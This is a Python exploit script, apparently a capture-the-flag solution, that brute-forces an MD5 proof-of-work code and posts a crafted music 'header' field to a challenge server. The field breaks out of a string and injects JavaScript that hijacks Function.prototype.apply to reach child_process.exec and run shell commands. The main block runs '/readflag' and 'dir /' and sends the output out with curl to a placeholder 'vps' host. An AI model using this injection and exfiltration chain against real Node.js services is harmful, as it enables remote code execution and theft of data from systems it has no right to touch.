#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/08/03, 17:11
"""

import requests as req
import re
import json
import hashlib
import random
import time

headers = {
    "Cookie": "PHPSESSID=nb"
}

URL = 'http://record.imagemlt.xyz:1080'


def run_code(arg):
    code = arg[0]
    start = 10000000
    __end = 100000000
    if len(arg) > 2:
        start = arg[1]
    if len(arg) > 3:
        __end = arg[2]
    if not code:
        return False
    while start <= __end:
        res = md5(str(start))[:len(code)]
        if res == code:
            return start
        start += 1
    return False


def md5(content):
    return hashlib.md5(content.encode('utf-8')).hexdigest()


def get_code():
    res = req.get(URL+'/code.php', headers=headers)
    if res.status_code == 200:
        return res.json()['code']
    return False


def post(m, c):
    data = {
        "music": json.dumps(m),
        "id": 2810583532,
        "code": c
    }
    # print(data)
    res = req.post(URL, data=data, headers=headers)
    if res.status_code == 200:
        return res.json()
    return False


def fuck(pl):
    m = {
        "header": "h',title:'t',desc:'d'};"+pl,
        "title": "title",
        "desc": "desc"
    }
    print("[+] Start...")
    c = get_code()
    print("[+] Get Code : %s" % c)
    if c:
        c = run_code([c])
        print("[+] DeCode : %s" % c)
        if c:
            r = post(m, c)
            print("[+] %s" % r)
            if r['success']:
                print("[+] Success")
                return True
            else:
                print("[+] Fail")
    return False


def genPl(cmd):
    # 暴力
    # return "Function.prototype._apply=Function.prototype.apply;Function.prototype.apply=function(...args){args[0]=='[object process]' && args[0].mainModule.require('child_process').exec('%s');return this._apply(...args);}\nrequest.get('http://vpsip/?_t=%s');//" % (cmd, time.time())
    # 官方
     # return "Function.prototype.apply2=Function.prototype.apply;Function.prototype.apply=function(...args){if(args[0]!=null && args[0]!=undefined && args[0].env!=undefined){Function.prototype.apply=Function.prototype.apply2;args[0].mainModule.require('child_process').exec('%s');}return this.apply2(...args)}\nrequest.get('http://www.baidu.com/',null)" % cmd
    # 优雅 - https://github.com/imagemlt/iCloudMusic
    return "Function.prototype._apply=Function.prototype.apply;Function.prototype.apply=function(...args){if(args[0]=='[object process]'){Function.prototype.apply=Function.prototype._apply;args[0].mainModule.require('child_process').exec('%s');}return this._apply(...args);}\nrequest.get('http://vpsip/?_t=%s');//" % (cmd, time.time())


if __name__ == '__main__':
    pl = genPl(
        'dir / > /tmp/vk.log;curl http://vps -F flag=@/tmp/vk.log')
    # print(pl)
    pl = genPl(
        '/readflag > /tmp/vk.log;curl http://vps -F flag=@/tmp/vk.log')
    while not fuck(pl):
        print("[+] Try agin")
